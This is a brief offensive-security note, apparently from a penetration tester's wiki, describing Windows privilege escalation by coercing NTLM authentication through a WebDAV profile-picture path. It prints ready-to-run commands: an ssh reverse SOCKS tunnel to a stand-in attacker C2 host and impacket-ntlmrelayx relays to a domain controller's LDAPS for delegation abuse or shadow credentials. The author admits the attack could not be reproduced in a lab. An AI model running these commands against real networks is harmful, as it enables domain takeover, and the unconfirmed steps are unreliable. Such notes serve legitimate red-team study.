---
title: NTLM Relay trough Profile Picture
---

[[notes/windows/escalation]] by coercing the computer account to authenticate over WebDAV.
Requires graphical login as domain user on a domain computer.

Windows computer: [[notes/pivoting/index|Tunnel]] a reverse SOCKS proxy and port 8080/tcp to your C2 server.

=== "builtin"
    ~~~ bat
    ssh.exe -R 127.0.0.1:1080 -L 8080:127.0.0.1:8080 proxy@c2.attacker.com
    ~~~

C2 server: Relay [[notes/ad/ntlm-relay-from-webdav|from WebDAV]] [[notes/ad/ntlm-relay-to-ldap|to LDAP]].

Either with [[notes/ad/rbcd]].

=== "[[notes/tools/impacket]]"
    ~~~ bash
    proxychains impacket-ntlmrelayx --no-smb-server --no-raw-server --no-wcf-server --http-port 8080 --serve-image ./profile.jpg -t ldaps://dc01.corp.local --delegate-access
    ~~~

Or [[notes/ad/shadow-credentials]].

=== "[[notes/tools/impacket]]"
    ~~~ bash
    proxychains impacket-ntlmrelayx --no-smb-server --no-raw-server --no-wcf-server --http-port 8080 --serve-image ./profile.jpg -t ldaps://dc01.corp.local --shadow-credentials --shadow-target 'ws01$'
    ~~~

Windows computer: Press the Windows key, right click on your profile picture, select *Change profile settings* and change your profile picture to `\\localhost@8080\share\profile.jpg`.

> **Note:** I was unable to recreate this attack in my lab.

References:

- [Coercions and Relays – The First Cred is the Deepest with Gabriel Prud'homme](https://www.youtube.com/watch?v=b0lLxLJKaRs&t=3600s)
